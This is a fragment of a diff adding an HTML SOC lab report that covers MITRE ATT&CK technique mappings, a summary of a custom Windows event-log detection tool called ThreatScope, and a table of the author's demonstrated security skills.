+                        <tr><td><span class="mitre-id">T1090.003</span></td><td>Multi-hop Proxy (Tor)</td><td>Command &amp; Control</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1134 / T1134.001</span></td><td>Access Token Manipulation</td><td>Privilege Escalation</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1564.004</span></td><td>NTFS Alternate Data Streams</td><td>Defense Evasion</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1505.003</span></td><td>Web Shell</td><td>Persistence</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1087.001</span></td><td>Local Account Discovery</td><td>Discovery</td><td>ThreatScope</td></tr>
+                        <tr><td><span class="mitre-id">T1082</span></td><td>System Information Discovery</td><td>Discovery</td><td>ThreatScope</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 7. THREATSCOPE TOOL SUMMARY ── -->
+        <section class="section">
+            <div class="section-number">Section 07</div>
+            <h2>ThreatScope — Tool Summary</h2>
+            <p>ThreatScope (v3.0.0) is a custom-built Python threat detection engine developed as part of this project's toolset. It was used to perform deep static analysis on exported Windows Event Log files (.evtx), providing detection capabilities beyond what is natively available in a standard SIEM deployment.</p>
+
+            <figure class="screenshot">
+                <img src="images/image14.png" alt="ThreatScope full report — security_logs.evtx">
+                <figcaption><strong>Figure 7.1</strong> — ThreatScope v3.0.0 full analysis report for security_logs.evtx (21 MB): 17,697 lines processed, 100% CRITICAL threat score, 7 findings, 7 MITRE techniques, 57 IOCs extracted</figcaption>
+            </figure>
+
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Capability</th><th>Details</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>Detection Rules</strong></td><td>144 built-in rules + 1 Sigma rule (custom)</td></tr>
+                        <tr><td><strong>Log Support</strong></td><td>.evtx, .log, .txt (Windows Event Logs)</td></tr>
+                        <tr><td><strong>MITRE Mapping</strong></td><td>Automatic technique mapping per finding</td></tr>
+                        <tr><td><strong>IOC Extraction</strong></td><td>IPs, domains, URLs, hashes, CVEs</td></tr>
+                        <tr><td><strong>Export Formats</strong></td><td>JSON report + STIX 2.1 threat intel bundle</td></tr>
+                        <tr><td><strong>File Integrity</strong></td><td>MD5 + SHA-256 hash of every analyzed file</td></tr>
+                        <tr><td><strong>Interface</strong></td><td>Full GUI + CLI mode support</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- ── 8. CONCLUSIONS & SKILLS DEMONSTRATED ── -->
+        <section class="section">
+            <div class="section-number">Section 08</div>
+            <h2>Conclusions &amp; Skills Demonstrated</h2>
+            <p>This project successfully demonstrated a complete SOC detection and response workflow across three realistic attack scenarios. The combination of Wazuh SIEM for real-time endpoint monitoring and ThreatScope for deep log analysis provides layered detection coverage that mirrors enterprise-grade security operations.</p>
+
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr><th>Skill Area</th><th>Evidence</th></tr>
+                    </thead>
+                    <tbody>
+                        <tr><td><strong>SIEM Deployment</strong></td><td>Deployed and configured Wazuh with live agent monitoring</td></tr>
+                        <tr><td><strong>Threat Detection</strong></td><td>Detected SSH brute force, PowerShell abuse, and privilege escalation</td></tr>
+                        <tr><td><strong>Log Analysis</strong></td><td>Analyzed 17,000+ log lines using custom detection engine (ThreatScope)</td></tr>
+                        <tr><td><strong>MITRE ATT&amp;CK</strong></td><td>Mapped 12 techniques across 6 tactics from real attack data</td></tr>
+                        <tr><td><strong>Threat Intelligence</strong></td><td>Generated STIX 2.1 bundles and extracted 57+ IOCs</td></tr>
+                        <tr><td><strong>Incident Response</strong></td><td>Documented triage, impact assessment, and remediation per scenario</td></tr>
+                        <tr><td><strong>Detection Engineering</strong></td><td>Built and applied 144 custom detection rules in ThreatScope</td></tr>
+                        <tr><td><strong>Linux/Windows Admin</strong></td><td>Configured VMs, networking, agents, and log collection pipelines</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+    </div>
+
+    <!-- ═══════════ FOOTER ═══════════ -->
+    <footer class="footer">
+        Report produced by <strong>Mohamed Sabry (0xSABRY)</strong> | SOC Analyst | DFIR | March 2026
+    </footer>
+
+</div>
+
+</body>
+</html>
